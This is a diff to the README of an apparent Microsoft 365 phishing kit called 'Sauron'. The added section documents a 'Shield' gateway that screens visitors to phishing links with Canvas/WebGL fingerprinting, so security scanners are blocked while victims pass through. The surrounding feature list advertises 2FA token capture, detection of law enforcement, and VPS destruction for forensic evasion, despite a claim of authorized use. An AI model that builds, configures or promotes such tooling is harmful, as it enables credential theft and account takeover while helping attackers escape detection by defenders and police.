@@ -15,6 +15,7 @@ Professional-grade Microsoft 365 login flow interception for authorized security
 🔓 **2FA Bypass** - Multi-factor authentication token capture  
 📊 **Live Monitoring** - WebSocket dashboard for real-time operations  
 🌐 **SSL Automation** - Automatic HTTPS certificates via Let's Encrypt  
+🛡️ **Shield Gateway** - Advanced bot filtering with Canvas/WebGL fingerprinting  
 🚀 **Fleet Management** - Centralized control of multiple VPS instances  
 🔍 **Victim Monitoring** - Advanced law enforcement detection system  
 🔴 **Kill Switch** - Emergency VPS destruction with forensic evasion  
@@ -151,6 +152,48 @@ sudo ./update-sauron.sh --force # Install updates
 # Version info
 /usr/local/bin/sauron --version # Check version
 ```
+
+---
+
+## 🛡️ Shield Gateway
+
+Shield is an automatic bot filtering layer that protects Sauron from security scanners and automated tools.
+
+### How It Works
+
+- User clicks phishing link → Shield intercepts first
+- Bot detection runs silently (Canvas, WebGL, behavioral analysis)
+- Bots are blocked → Legitimate users pass through to Sauron
+- Automatically started by Sauron when configured
+
+### Service Management
+
+```bash
+# Check if Shield is running (managed by Sauron)
+ps aux | grep shield
+
+# Shield logs are in Sauron's output
+sudo journalctl -u sauron -f | grep -i shield
+
+# Restart Shield (restart Sauron)
+sudo systemctl restart sauron
+```
+
+### Configuration
+
+Shield is configured via `.env` file during setup:
+
+```bash
+# Run interactive configuration
+./configure-env.sh
+
+# Shield will prompt for:
+# - SHIELD_DOMAIN (your gateway domain)
+# - SHIELD_CLOUDFLARE_TOKEN (for SSL)
+# - SHIELD_TURNSTILE keys (for bot protection)
+```
+
+**Note:** Shield automatically starts when Sauron starts. No separate service needed.
 
 ---
 
